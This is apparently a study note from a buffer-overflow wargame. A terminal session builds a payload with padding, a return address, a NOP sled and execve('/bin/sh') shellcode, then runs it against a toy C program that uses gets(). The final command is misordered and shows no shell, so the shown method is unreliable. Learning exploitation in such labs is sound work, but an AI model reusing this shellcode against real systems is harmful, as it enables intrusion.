# BOF_Using_file

- [Using (cat $file; cat) to run a simple BOF exploit](https://security.stackexchange.com/questions/155844/using-cat-file-cat-to-run-a-simple-bof-exploit)  

- [Using cat to overcome 'Stack smash detected'](https://security.stackexchange.com/questions/112009/using-cat-to-overcome-stack-smash-detected)

```assembly
[gremlin@localhost gremlin]$ ls
cobalt  cobolt  cobolt.c  core  exp.txt  test  test.c  tmp
[gremlin@localhost gremlin]$ bash2
[gremlin@localhost gremlin]$ cat exp.txt
AAAAAAAAAAAAAAAA
[gremlin@localhost gremlin]$ python -c 'print"A"*20+"\xcc\xfa\xff\xbf"+"\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"' > exp.txt
[gremlin@localhost gremlin]$ cat exp.txt
AAAAAAAAAAAAAAAAAAAAͺÿ¿1󿿐h//shh/bin⏓ኂ°
                                      ̀ 
[gremlin@localhost gremlin]$ cat test.c 
#include<stdio.h>
int main(){
char buffer[20];
gets(buffer);
puts(buffer);
puts("hihihihihihihihihihihihi");
return 0;
}
[gremlin@localhost gremlin]$ cat exp.txt; cat | ./test
AAAAAAAAAAAAAAAAAAAAͺÿ¿1󿿐h//shh/bin⏓ኂ°
                                      ̀ 


hihihihihihihihihihihihi

Broken pipe
[gremlin@localhost gremlin]$ exit 
exit
[gremlin@localhost gremlin]$ exit
logout
```


- Like this?